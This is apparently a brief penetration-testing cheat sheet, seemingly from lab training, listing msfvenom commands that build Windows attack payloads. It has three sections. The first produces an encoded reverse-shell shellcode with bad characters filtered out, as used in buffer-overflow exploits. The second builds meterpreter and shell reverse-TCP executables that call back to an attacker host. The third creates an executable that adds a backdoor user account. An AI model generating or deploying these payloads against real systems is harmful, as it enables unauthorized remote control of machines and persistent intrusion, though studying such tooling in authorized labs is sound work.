### Generate a windows Reverse Shell

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.xxx LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\3d"
```

### Generate a windows reverse shell payload

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.119.xxx LPORT=4444 -f exe > binary.exe
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.xxx LPORT=4444 -f exe > binary2.exe
```

### Create User

```
msfvenom -p windows/adduser USER=username PASS=password -f exe > adduser.exe
```

